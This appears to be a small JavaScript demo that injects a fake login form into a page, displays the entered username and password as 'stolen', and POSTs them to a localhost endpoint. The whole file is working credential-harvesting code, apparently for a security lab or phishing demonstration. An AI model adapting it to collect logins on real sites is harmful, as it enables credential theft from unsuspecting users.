var h1 = document.createElement('h1');

var form = document.createElement('form');
form.setAttribute('accept-charset', 'utf-8'); 
form.setAttribute('id', 'form'); 

var inputUsername = document.createElement('input');
inputUsername.setAttribute('name', 'username');
inputUsername.setAttribute('type', 'text');
inputUsername.setAttribute('id','username');

var inputPassword = document.createElement('input');
inputPassword.setAttribute('name', 'password');
inputPassword.setAttribute('type', 'password');
inputPassword.setAttribute('id','password');

var submitButton = document.createElement('input');
submitButton.setAttribute('value', 'Please log in, this form is legit.');
submitButton.setAttribute('id','submit');
submitButton.setAttribute('type', 'submit');

form.appendChild(inputUsername);
form.appendChild(document.createElement('br'));
form.appendChild(inputPassword);
form.appendChild(document.createElement('br'));
form.appendChild(submitButton);

form.addEventListener('submit', (e) => {
    e.preventDefault();
    e.stopPropagation();

    if (e.target && e.target.id == 'form') {

        h1.innerHTML = '';
        
        if (!isEmpty(inputUsername.value)) {
            h1.innerHTML += 'Your username got stolen: "' + inputUsername.value + '" ';
        }

        if (!isEmpty(inputPassword.value)) {
            h1.innerHTML += 'Your password got stolen: "' + inputPassword.value + '"';
        }
        
        
        
        h1.innerHTML
        var request = new XMLHttpRequest();
        request.open('POST', 'http://localhost:8000/FakeLogin');
        request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        request.send('username=' + inputUsername.value + '&password=' + inputPassword.value);
    }
});

var body = document.getElementsByTagName('body')[0];
body.appendChild(form);
body.appendChild(h1);


function isEmpty(s) {
    return s.trim() == '';
}